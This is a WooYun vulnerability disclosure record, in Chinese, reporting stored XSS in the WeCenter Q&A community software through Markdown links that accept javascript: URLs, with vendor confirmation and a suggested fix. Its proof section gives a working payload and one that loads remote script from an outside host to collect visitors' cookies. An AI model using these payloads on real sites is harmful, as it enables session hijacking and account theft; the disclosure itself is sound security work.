{"id": 55501, "wybug_id": "wooyun-2014-060727", "wybug_title": "wecenter社交化问答社区敏感位置XSS", "wybug_corp": "www.wecenter.com", "wybug_author": "phith0n", "wybug_date": "2014-05-30 11:19", "wybug_open_date": "2014-08-28 11:20", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-28：\t细节向公众公开  简要描述： markdown处理不当造成的XSS。ps~我特别喜欢wecenter现在的风格，小清新又不失用户体验，不愧是我最欣赏的cms之一。 详细说明：  发帖处（提问及回复）应该算敏感位置吧？wecenter中任何富文本都是以markdown的形似保存于发布的，所以避免了很多常见的富文本XSS。markdown处理富文本一般是这样的流程：01.htmlspecialchar处理用户输入的信息。02.保存入数据库。03.在其他用户访问时，从数据库中取出信息。04.在前端（或后端）根据markdown的规则把用户信息放入相应的位置。如**aaa**，就会变成<strong>aaa</strong>，所有html标签是此时加入的。所以markdown的过滤效果等同于htmlspecialchar，如果你不注意一些不含<、>、\"这些字符的XSS的话，也会中招。比如发表超链接的位置。Markdown的超链接是这种形式：\n[显示文字](连接地址)\n如果链接地址这里写入javascript伪协议的话，一样可以在用户点击后执行XSS。详见漏洞证明。   漏洞证明：  在提问处发表提问，或者在留言处发表留言：\n[点这里](javascript:alert(/xss/))\n\n\n发表以后查看，点击后触发：\n\n来个加载远程js的exp:\n[点这里](javascript:$.getScript('http://xss.com/9WfKui'))\n可收到cookie：\n\n   修复方案：  检查超链接的url是否以http或https开头，如果不是，则强制加上http://   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2014-05-30 11:23 厂商回复： 已确认是 Markdown 解析连接方面的疏忽, 感谢对 WeCenter 的支持！ 最新状态： 2014-05-30：已经发布新版 http://wenda.wecenter.com/question/17683  ", "replys": "漏洞评价：\n评论\n     2014-05-18 19:21 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  小清新又不失用户体验    \n     2014-05-30 11:28 |    \t\tanwsion(乌云厂商)\t\t \n  @BadCat 谢谢    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}